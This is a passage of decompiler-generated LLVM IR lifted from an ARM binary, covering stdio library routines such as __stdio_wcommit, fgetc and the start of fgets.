  store i32 %v1_f8c8, i32* %v4_f8c8, align 4
  %v1_f8cc = load i32, i32* %r3.global-to-local, align 4
  %v2_f8cc = load i32, i32* %r5.global-to-local, align 4
  %v3_f8cc = add i32 %v2_f8cc, 28
  %v4_f8cc = inttoptr i32 %v3_f8cc to i32*
  store i32 %v1_f8cc, i32* %v4_f8cc, align 4
  %v1_f8d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_f8d0 = load i32, i32* %r5.global-to-local, align 4
  %v3_f8d0 = add i32 %v2_f8d0, 16
  %v4_f8d0 = inttoptr i32 %v3_f8d0 to i32*
  store i32 %v1_f8d0, i32* %v4_f8d0, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_f8d4 = load i32, i32* %sl.global-to-local, align 4
  %v1_f8d4 = inttoptr i32 %v0_f8d4 to i32*
  %v2_f8d4 = load i32, i32* %v1_f8d4, align 4
  store i32 %v2_f8d4, i32* %r0.global-to-local, align 4
  %v3_f8d4 = add i32 %v0_f8d4, 4
  %v4_f8d4 = inttoptr i32 %v3_f8d4 to i32*
  %v5_f8d4 = load i32, i32* %v4_f8d4, align 4
  store i32 %v5_f8d4, i32* %r1.global-to-local, align 4
  %v6_f8d4 = add i32 %v0_f8d4, 8
  %v7_f8d4 = inttoptr i32 %v6_f8d4 to i32*
  %v8_f8d4 = load i32, i32* %v7_f8d4, align 4
  store i32 %v8_f8d4, i32* %r2.global-to-local, align 4
  %v1_f8dc = load i32, i32* %r5.global-to-local, align 4
  %v2_f8dc = add i32 %v1_f8dc, 52
  %v3_f8dc = inttoptr i32 %v2_f8dc to i32*
  store i32 1, i32* %v3_f8dc, align 4
  %v0_f8e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_f8e0 = add i32 %v0_f8e0, 56
  store i32 %v1_f8e0, i32* %r3.global-to-local, align 4
  %v2_f8e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_f8e8 = inttoptr i32 %v1_f8e0 to i32*
  store i32 %v2_f8e4, i32* %v1_f8e8, align 4
  %v3_f8e8 = add i32 %v0_f8e0, 60
  %v4_f8e8 = inttoptr i32 %v3_f8e8 to i32*
  %v5_f8e8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_f8e8, i32* %v4_f8e8, align 4
  %v6_f8e8 = add i32 %v0_f8e0, 64
  %v7_f8e8 = inttoptr i32 %v6_f8e8 to i32*
  %v8_f8e8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_f8e8, i32* %v7_f8e8, align 4
  %v0_f8ec = load i32, i32* %r5.global-to-local, align 4
  %v1_f8ec = add i32 %v0_f8ec, 32
  %v2_f8ec = inttoptr i32 %v1_f8ec to i32*
  %v3_f8ec = load i32, i32* %v2_f8ec, align 4
  store i32 %v3_f8ec, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8f0 = icmp eq i32 %v3_f8ec, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_f8f8 = add i32 %v3_f8ec, 56
  store i32 %v1_f8f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_f8f0, label %dec_label_pc_f904, label %dec_label_pc_f868

dec_label_pc_f904:                                ; preds = %.thread10, %entry
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_f908 = load i32, i32* %r7.global-to-local, align 4
  %v2_f908 = add i32 %v0_f908, 84
  %v3_f908 = inttoptr i32 %v2_f908 to i32*
  %v4_f908 = load i32, i32* %v3_f908, align 4
  store i32 %v4_f908, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_f908 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f92814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_f92814, label %dec_label_pc_f930, label %dec_label_pc_f914

dec_label_pc_f914:                                ; preds = %dec_label_pc_f904, %dec_label_pc_f928
  %v1_f91c = phi i32 [ %storemerge, %dec_label_pc_f928 ], [ %storemerge12, %dec_label_pc_f904 ]
  %v1_f914 = inttoptr i32 %v1_f91c to i16*
  %v2_f914 = load i16, i16* %v1_f914, align 2
  %v3_f914 = zext i16 %v2_f914 to i32
  store i32 %v3_f914, i32* %r3.global-to-local, align 4
  %v1_f918 = and i32 %v3_f914, 64
  %v2_f918 = icmp eq i32 %v1_f918, 0
  br i1 %v2_f918, label %dec_label_pc_f928, label %bb39

bb39:                                             ; preds = %dec_label_pc_f914
  store i32 %v1_f91c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f928

dec_label_pc_f928:                                ; preds = %dec_label_pc_f914, %bb39
  %v1_f920 = xor i1 %v2_f918, true
  call void @__pseudo_cond_branch(i1 %v1_f920, i32 ptrtoint (i32* @global_var_f958.366 to i32))
  %v0_f924 = load i32, i32* %r4.global-to-local, align 4
  %v1_f924 = add i32 %v0_f924, 32
  %storemerge.in = inttoptr i32 %v1_f924 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f928 = icmp eq i32 %storemerge, 0
  br i1 %v2_f928, label %dec_label_pc_f930, label %dec_label_pc_f914

dec_label_pc_f930:                                ; preds = %dec_label_pc_f928, %dec_label_pc_f904
  %v2_f934 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_f934, i32* %r4.global-to-local, align 4
  %v1_f938 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_f938

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_f8ec, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f88c, { 1, 0 }
  uselistorder i32 %v4_f84c, { 2, 1, 0 }
  uselistorder i32 %v4_f81c, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 10, 1, 11, 9, 12 }
  uselistorder i32* %r4.global-to-local, { 2, 7, 6, 1, 5, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 2, 3, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 0, 7, 3, 4, 5, 6, 1 }
  uselistorder label %dec_label_pc_f928, { 1, 0 }
  uselistorder label %dec_label_pc_f914, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f8ac, { 1, 0 }
  uselistorder label %dec_label_pc_f888, { 1, 0 }
  uselistorder label %dec_label_pc_f868, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f958 = load i32, i32* @r4, align 4
  store i32 %v3_f958, i32* %stack_var_-8, align 4
  %v0_f95c = load i32, i32* @r0, align 4
  %v1_f95c = add i32 %v0_f95c, 8
  %v2_f95c = inttoptr i32 %v1_f95c to i32*
  %v3_f95c = load i32, i32* %v2_f95c, align 4
  store i32 %v3_f95c, i32* @r1, align 4
  %v1_f960 = add i32 %v0_f95c, 16
  %v2_f960 = inttoptr i32 %v1_f960 to i32*
  %v3_f960 = load i32, i32* %v2_f960, align 4
  %v9_f964 = icmp eq i32 %v3_f960, %v3_f95c
  store i32 %v0_f95c, i32* %r4.global-to-local, align 4
  br i1 %v9_f964, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_f95c, i32* %v2_f960, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_f970 = xor i1 %v9_f964, true
  call void @__pseudo_cond_branch(i1 %v1_f970, i32 ptrtoint (i32* @global_var_11df4.367 to i32))
  %v0_f974 = load i32, i32* %r4.global-to-local, align 4
  %v1_f974 = add i32 %v0_f974, 8
  %v2_f974 = inttoptr i32 %v1_f974 to i32*
  %v3_f974 = load i32, i32* %v2_f974, align 4
  store i32 %v3_f974, i32* @r3, align 4
  %v1_f978 = add i32 %v0_f974, 16
  %v2_f978 = inttoptr i32 %v1_f978 to i32*
  %v3_f978 = load i32, i32* %v2_f978, align 4
  %v2_f97c = sub i32 %v3_f978, %v3_f974
  %v2_f980 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f980, i32* @r4, align 4
  ret i32 %v2_f97c

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_f988 = load i32, i32* @r4, align 4
  store i32 %v3_f988, i32* %stack_var_-20, align 4
  %v6_f988 = load i32, i32* @r5, align 4
  %v9_f988 = load i32, i32* @r6, align 4
  %v12_f988 = load i32, i32* @r7, align 4
  %v15_f988 = load i32, i32* @lr, align 4
  %v1_f98c = add i32 %arg1, 52
  %v2_f98c = inttoptr i32 %v1_f98c to i32*
  %v3_f98c = load i32, i32* %v2_f98c, align 4
  store i32 %v3_f98c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f990 = icmp eq i32 %v3_f98c, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_f990, label %dec_label_pc_f9c4, label %dec_label_pc_f9a0

dec_label_pc_f9a0:                                ; preds = %entry
  %v1_f9a0 = add i32 %arg1, 16
  %v2_f9a0 = inttoptr i32 %v1_f9a0 to i32*
  %v3_f9a0 = load i32, i32* %v2_f9a0, align 4
  store i32 %v3_f9a0, i32* %r2.global-to-local, align 4
  %v1_f9a4 = add i32 %arg1, 24
  %v2_f9a4 = inttoptr i32 %v1_f9a4 to i32*
  %v3_f9a4 = load i32, i32* %v2_f9a4, align 4
  store i32 %v3_f9a4, i32* %r3.global-to-local, align 4
  %v3_f9a8 = icmp uge i32 %v3_f9a0, %v3_f9a4
  store i1 %v3_f9a8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_f9a8, label %dec_label_pc_f9b8, label %.thread

.thread:                                          ; preds = %dec_label_pc_f9a0
  %v2_f9ac = inttoptr i32 %v3_f9a0 to i8*
  %v3_f9ac = load i8, i8* %v2_f9ac, align 1
  %v4_f9ac = zext i8 %v3_f9ac to i32
  store i32 %v4_f9ac, i32* %r5.global-to-local, align 4
  %v6_f9ac = add i32 %v3_f9a0, 1
  store i32 %v6_f9ac, i32* %r2.global-to-local, align 4
  store i32 %v6_f9ac, i32* %v2_f9a0, align 4
  br label %dec_label_pc_fabc

dec_label_pc_f9b8:                                ; preds = %dec_label_pc_f9a0
  %v1_f9b8 = inttoptr i32 %arg1 to i16*
  %v2_f9b8 = call i32 @getc_unlocked(i16* %v1_f9b8)
  store i32 %v2_f9b8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_fabc

dec_label_pc_f9c4:                                ; preds = %entry
  %v0_f9c4 = call i32 @__aeabi_read_tp()
  %v0_f9c8 = load i32, i32* @r7, align 4
  %v1_f9c8 = add i32 %v0_f9c8, 64
  %v2_f9c8 = inttoptr i32 %v1_f9c8 to i32*
  %v3_f9c8 = load i32, i32* %v2_f9c8, align 4
  store i32 %v3_f9c8, i32* %r3.global-to-local, align 4
  %v1_f9cc = add i32 %v0_f9c4, -1168
  store i32 %v1_f9cc, i32* @r6, align 4
  %v3_f9d0 = icmp uge i32 %v3_f9c8, %v1_f9cc
  store i1 %v3_f9d0, i1* %cpsr_c.global-to-local, align 1
  %v9_f9d0 = icmp eq i32 %v3_f9c8, %v1_f9cc
  br i1 %v9_f9d0, label %dec_label_pc_fa18, label %dec_label_pc_f9d8

dec_label_pc_f9d8:                                ; preds = %dec_label_pc_f9c4
  %v1_f9d8 = add i32 %v0_f9c8, 56
  store i32 %v1_f9d8, i32* @r5, align 4
  store i32 %v1_f9d8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f9e4

dec_label_pc_f9e4:                                ; preds = %dec_label_pc_f9f0.dec_label_pc_f9e4_crit_edge, %dec_label_pc_f9d8
  %v0_f9e4 = phi i32 [ %v0_f9e4.pre, %dec_label_pc_f9f0.dec_label_pc_f9e4_crit_edge ], [ %v1_f9d8, %dec_label_pc_f9d8 ]
  %v1_f9e4 = inttoptr i32 %v0_f9e4 to i32*
  %v2_f9e4 = load i32, i32* %v1_f9e4, align 4
  store i32 %v2_f9e4, i32* %r3.global-to-local, align 4
  %v1_f9e8 = load i32, i32* @r4, align 4
  %v3_f9e8 = icmp uge i32 %v2_f9e4, %v1_f9e8
  store i1 %v3_f9e8, i1* %cpsr_c.global-to-local, align 1
  %v9_f9e8 = icmp eq i32 %v2_f9e4, %v1_f9e8
  br i1 %v9_f9e8, label %dec_label_pc_f9f0, label %dec_label_pc_fa08

dec_label_pc_f9f0:                                ; preds = %dec_label_pc_f9e4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fa00 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fa00, label %dec_label_pc_fa04, label %dec_label_pc_f9f0.dec_label_pc_f9e4_crit_edge

dec_label_pc_f9f0.dec_label_pc_f9e4_crit_edge:    ; preds = %dec_label_pc_f9f0
  %v0_f9e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f9e4

dec_label_pc_fa04:                                ; preds = %dec_label_pc_f9f0
  %v0_fa04 = load i32, i32* @r4, align 4
  store i32 %v0_fa04, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fa08

dec_label_pc_fa08:                                ; preds = %dec_label_pc_f9e4, %dec_label_pc_fa04
  %v0_fa08 = phi i32 [ %v0_fa04, %dec_label_pc_fa04 ], [ %v2_f9e4, %dec_label_pc_f9e4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa08 = icmp eq i32 %v0_fa08, 0
  br i1 %v2_fa08, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_fa08
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_fa08, %bb
  store i32 64020, i32* @lr, align 4
  %v1_fa10 = xor i1 %v2_fa08, true
  call void @__pseudo_cond_branch(i1 %v1_fa10, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_fa14 = load i32, i32* @r6, align 4
  %v1_fa14 = load i32, i32* @r7, align 4
  %v2_fa14 = add i32 %v1_fa14, 64
  %v3_fa14 = inttoptr i32 %v2_fa14 to i32*
  store i32 %v0_fa14, i32* %v3_fa14, align 4
  %v0_fa18.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fa18

dec_label_pc_fa18:                                ; preds = %dec_label_pc_f9c4, %bb18
  %v1_fa28 = phi i32 [ %v0_f9c8, %dec_label_pc_f9c4 ], [ %v0_fa18.pre, %bb18 ]
  %v1_fa18 = add i32 %v1_fa28, 60
  %v2_fa18 = inttoptr i32 %v1_fa18 to i32*
  %v3_fa18 = load i32, i32* %v2_fa18, align 4
  store i32 %v3_fa18, i32* %r2.global-to-local, align 4
  %v1_fa1c = add i32 %v1_fa28, 16
  %v2_fa1c = inttoptr i32 %v1_fa1c to i32*
  %v3_fa1c = load i32, i32* %v2_fa1c, align 4
  store i32 %v3_fa1c, i32* @r1, align 4
  %v1_fa20 = add i32 %v1_fa28, 24
  %v2_fa20 = inttoptr i32 %v1_fa20 to i32*
  %v3_fa20 = load i32, i32* %v2_fa20, align 4
  store i32 %v3_fa20, i32* %r3.global-to-local, align 4
  %v1_fa24 = add i32 %v3_fa18, 1
  store i32 %v1_fa24, i32* %r2.global-to-local, align 4
  store i32 %v1_fa24, i32* %v2_fa18, align 4
  %v0_fa2c = load i32, i32* @r1, align 4
  %v1_fa2c = load i32, i32* %r3.global-to-local, align 4
  %v3_fa2c = icmp uge i32 %v0_fa2c, %v1_fa2c
  store i1 %v3_fa2c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_fa2c, label %dec_label_pc_fa3c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_fa18
  %v2_fa30 = inttoptr i32 %v0_fa2c to i8*
  %v3_fa30 = load i8, i8* %v2_fa30, align 1
  %v4_fa30 = zext i8 %v3_fa30 to i32
  store i32 %v4_fa30, i32* %r5.global-to-local, align 4
  %v6_fa30 = add i32 %v0_fa2c, 1
  store i32 %v6_fa30, i32* @r1, align 4
  %v2_fa34 = load i32, i32* @r7, align 4
  %v3_fa34 = add i32 %v2_fa34, 16
  %v4_fa34 = inttoptr i32 %v3_fa34 to i32*
  store i32 %v6_fa30, i32* %v4_fa34, align 4
  br label %dec_label_pc_fa48

dec_label_pc_fa3c:                                ; preds = %dec_label_pc_fa18
  %v0_fa3c = load i32, i32* @r7, align 4
  %v1_fa40 = inttoptr i32 %v0_fa3c to i16*
  %v2_fa40 = call i32 @getc_unlocked(i16* %v1_fa40)
  store i32 %v2_fa40, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_fa48

dec_label_pc_fa48:                                ; preds = %.thread2, %dec_label_pc_fa3c
  %v0_fa48 = load i32, i32* @r7, align 4
  %v1_fa48 = add i32 %v0_fa48, 60
  %v2_fa48 = inttoptr i32 %v1_fa48 to i32*
  %v3_fa48 = load i32, i32* %v2_fa48, align 4
  %v1_fa4c = add i32 %v3_fa48, -1
  store i32 %v1_fa4c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa50 = icmp eq i32 %v1_fa4c, 0
  store i32 %v1_fa4c, i32* %v2_fa48, align 4
  br i1 %v2_fa50, label %dec_label_pc_fa5c, label %dec_label_pc_fabc

dec_label_pc_fa5c:                                ; preds = %dec_label_pc_fa48
  %v0_fa5c = load i32, i32* %r3.global-to-local, align 4
  %v1_fa5c = load i32, i32* @r7, align 4
  %v2_fa5c = add i32 %v1_fa5c, 64
  %v3_fa5c = inttoptr i32 %v2_fa5c to i32*
  store i32 %v0_fa5c, i32* %v3_fa5c, align 4
  %v0_fa60 = load i32, i32* @r7, align 4
  %v1_fa60 = add i32 %v0_fa60, 56
  store i32 %v1_fa60, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fa64

dec_label_pc_fa64:                                ; preds = %dec_label_pc_fa94.dec_label_pc_fa64_crit_edge, %dec_label_pc_fa5c
  %v0_fa6c = phi i32 [ %v0_fa6c.pre, %dec_label_pc_fa94.dec_label_pc_fa64_crit_edge ], [ %v1_fa60, %dec_label_pc_fa5c ]
  %v0_fa64 = phi i32 [ %v0_fa64.pre, %dec_label_pc_fa94.dec_label_pc_fa64_crit_edge ], [ %v0_fa60, %dec_label_pc_fa5c ]
  %v1_fa64 = add i32 %v0_fa64, 56
  %v2_fa64 = inttoptr i32 %v1_fa64 to i32*
  %v3_fa64 = load i32, i32* %v2_fa64, align 4
  store i32 %v3_fa64, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_fa6c, i32* %r2.global-to-local, align 4
  %v1_fa7022 = inttoptr i32 %v0_fa6c to i32*
  %v2_fa7023 = load i32, i32* %v1_fa7022, align 4
  store i32 %v2_fa7023, i32* %r3.global-to-local, align 4
  %v3_fa7425 = icmp uge i32 %v2_fa7023, %v3_fa64
  store i1 %v3_fa7425, i1* %cpsr_c.global-to-local, align 1
  %v9_fa7431 = icmp eq i32 %v2_fa7023, %v3_fa64
  br i1 %v9_fa7431, label %dec_label_pc_fa7c, label %dec_label_pc_fa94

dec_label_pc_fa7c:                                ; preds = %dec_label_pc_fa64, %dec_label_pc_fa7c.dec_label_pc_fa70_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fa8c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fa8c, label %dec_label_pc_fa90, label %dec_label_pc_fa7c.dec_label_pc_fa70_crit_edge

dec_label_pc_fa7c.dec_label_pc_fa70_crit_edge:    ; preds = %dec_label_pc_fa7c
  %v0_fa70.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fa74.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_fa70 = inttoptr i32 %v0_fa70.pre to i32*
  %v2_fa70 = load i32, i32* %v1_fa70, align 4
  store i32 %v2_fa70, i32* %r3.global-to-local, align 4
  %v3_fa74 = icmp uge i32 %v2_fa70, %v1_fa74.pre
  store i1 %v3_fa74, i1* %cpsr_c.global-to-local, align 1
  %v9_fa74 = icmp eq i32 %v2_fa70, %v1_fa74.pre
  br i1 %v9_fa74, label %dec_label_pc_fa7c, label %dec_label_pc_fa94

dec_label_pc_fa90:                                ; preds = %dec_label_pc_fa7c
  %v0_fa90 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fa90, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fa94

dec_label_pc_fa94:                                ; preds = %dec_label_pc_fa64, %dec_label_pc_fa7c.dec_label_pc_fa70_crit_edge, %dec_label_pc_fa90
  %v0_fa9c = phi i32 [ %v0_fa90, %dec_label_pc_fa90 ], [ %v2_fa7023, %dec_label_pc_fa64 ], [ %v2_fa70, %dec_label_pc_fa7c.dec_label_pc_fa70_crit_edge ]
  %v1_fa94 = phi i32 [ %v0_fa90, %dec_label_pc_fa90 ], [ %v3_fa64, %dec_label_pc_fa64 ], [ %v1_fa74.pre, %dec_label_pc_fa7c.dec_label_pc_fa70_crit_edge ]
  %v3_fa94 = icmp uge i32 %v0_fa9c, %v1_fa94
  store i1 %v3_fa94, i1* %cpsr_c.global-to-local, align 1
  %v9_fa94 = icmp eq i32 %v0_fa9c, %v1_fa94
  br i1 %v9_fa94, label %dec_label_pc_fa9c, label %dec_label_pc_fa94.dec_label_pc_fa64_crit_edge

dec_label_pc_fa94.dec_label_pc_fa64_crit_edge:    ; preds = %dec_label_pc_fa94
  %v0_fa64.pre = load i32, i32* @r7, align 4
  %v0_fa6c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fa64

dec_label_pc_fa9c:                                ; preds = %dec_label_pc_fa94
  %v2_fa9c = icmp ne i32 %v1_fa94, 0
  store i1 %v2_fa9c, i1* %cpsr_c.global-to-local, align 1
  %v7_faa0 = icmp slt i32 %v1_fa94, 2
  br i1 %v7_faa0, label %dec_label_pc_fabc, label %dec_label_pc_faa4

dec_label_pc_faa4:                                ; preds = %dec_label_pc_fa9c
  %v0_faa8 = load i32, i32* @r1, align 4
  %v1_faa8 = add i32 %v0_faa8, 129
  store i32 %v1_faa8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fabc

dec_label_pc_fabc:                                ; preds = %.thread, %dec_label_pc_fa48, %dec_label_pc_faa4, %dec_label_pc_fa9c, %dec_label_pc_f9b8
  %v0_fabc = load i32, i32* %r5.global-to-local, align 4
  %v2_fac4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_fac4, i32* @r4, align 4
  store i32 %v6_f988, i32* @r5, align 4
  store i32 %v9_f988, i32* @r6, align 4
  store i32 %v12_f988, i32* @r7, align 4
  store i32 %v15_f988, i32* @lr, align 4
  ret i32 %v0_fabc

; uselistorder directives
  uselistorder i32 %v0_fa90, { 1, 0, 2 }
  uselistorder i32 %v1_fa74.pre, { 0, 2, 1 }
  uselistorder i32 %v0_fa2c, { 1, 0, 2 }
  uselistorder i32 %v1_fa28, { 0, 2, 1 }
  uselistorder i32 %v1_f9e8, { 1, 0 }
  uselistorder i32 %v3_f9a0, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_fabc, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_fa94, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fa7c, { 1, 0 }
  uselistorder label %dec_label_pc_fa48, { 1, 0 }
  uselistorder label %dec_label_pc_fa18, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_fa08, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_facc = load i32, i32* @r4, align 4
  store i32 %v3_facc, i32* %stack_var_-32, align 4
  %v6_facc = load i32, i32* @r5, align 4
  %v9_facc = load i32, i32* @r6, align 4
  %v12_facc = load i32, i32* @r7, align 4
  %v15_facc = load i32, i32* @r8, align 4
  %v24_facc = load i32, i32* @lr, align 4
  %v1_fad0 = add i32 %arg3, 52
  %v2_fad0 = inttoptr i32 %v1_fad0 to i32*
  %v3_fad0 = load i32, i32* %v2_fad0, align 4
  store i32 %v3_fad0, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fad4 = icmp eq i32 %v3_fad0, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_fad4, label %dec_label_pc_fae8, label %dec_label_pc_fb4c

dec_label_pc_fae8:                                ; preds = %entry
  %v0_fae8 = call i32 @__aeabi_read_tp()
  %v1_faec = add i32 %arg3, 64
  %v2_faec = inttoptr i32 %v1_faec to i32*
  %v3_faec = load i32, i32* %v2_faec, align 4
  store i32 %v3_faec, i32* %r3.global-to-local, align 4
  %v1_faf0 = add i32 %v0_fae8, -1168
  store i32 %v1_faf0, i32* @r8, align 4
  %v3_faf4 = icmp uge i32 %v3_faec, %v1_faf0
  store i1 %v3_faf4, i1* %cpsr_c.global-to-local, align 1
  %v9_faf4 = icmp eq i32 %v3_faec, %v1_faf0
  br i1 %v9_faf4, label %dec_label_pc_fb40, label %dec_label_pc_fafc

dec_label_pc_fafc:                                ; preds = %dec_label_pc_fae8
  %v1_fafc = add i32 %arg3, 56
  store i32 %v1_fafc, i32* @r5, align 4
  store i32 %v1_fafc, i32* %r2.global-to-local, align 4
  %v0_fb08 = load i32, i32* @r6, align 4
  store i32 %v0_fb08, i32* @r4, align 4
  %v1_fb0c36 = inttoptr i32 %v1_fafc to i32*
  %v2_fb0c37 = load i32, i32* %v1_fb0c36, align 4
  store i32 %v2_fb0c37, i32* %r3.global-to-local, align 4
  %v3_fb1039 = icmp uge i32 %v2_fb0c37, %v0_fb08
  store i1 %v3_fb1039, i1* %cpsr_c.global-to-local, align 1
  %v9_fb1045 = icmp eq i32 %v2_fb0c37, %v0_fb08
  br i1 %v9_fb1045, label %dec_label_pc_fb18, label %dec_label_pc_fb30

dec_label_pc_fb18:                                ; preds = %dec_label_pc_fafc, %dec_label_pc_fb18.dec_label_pc_fb0c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fb28 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fb28, label %dec_label_pc_fb2c, label %dec_label_pc_fb18.dec_label_pc_fb0c_crit_edge

dec_label_pc_fb18.dec_label_pc_fb0c_crit_edge:    ; preds = %dec_label_pc_fb18
  %v0_fb0c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fb10.pre = load i32, i32* @r4, align 4
  %v1_fb0c = inttoptr i32 %v0_fb0c.pre to i32*
  %v2_fb0c = load i32, i32* %v1_fb0c, align 4
  store i32 %v2_fb0c, i32* %r3.global-to-local, align 4
  %v3_fb10 = icmp uge i32 %v2_fb0c, %v1_fb10.pre
  store i1 %v3_fb10, i1* %cpsr_c.global-to-local, align 1
  %v9_fb10 = icmp eq i32 %v2_fb0c, %v1_fb10.pre
  br i1 %v9_fb10, label %dec_label_pc_fb18, label %dec_label_pc_fb30

dec_label_pc_fb2c:                                ; preds = %dec_label_pc_fb18
  %v0_fb2c = load i32, i32* @r4, align 4
  store i32 %v0_fb2c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fb30

dec_label_pc_fb30:                                ; preds = %dec_label_pc_fafc, %dec_label_pc_fb18.dec_label_pc_fb0c_crit_edge, %dec_label_pc_fb2c
  %v0_fb30 = phi i32 [ %v0_fb2c, %dec_label_pc_fb2c ], [ %v2_fb0c37, %dec_label_pc_fafc ], [ %v2_fb0c, %dec_label_pc_fb18.dec_label_pc_fb0c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb30 = icmp eq i32 %v0_fb30, 0
  br i1 %v2_fb30, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_fb30
  br label %bb20

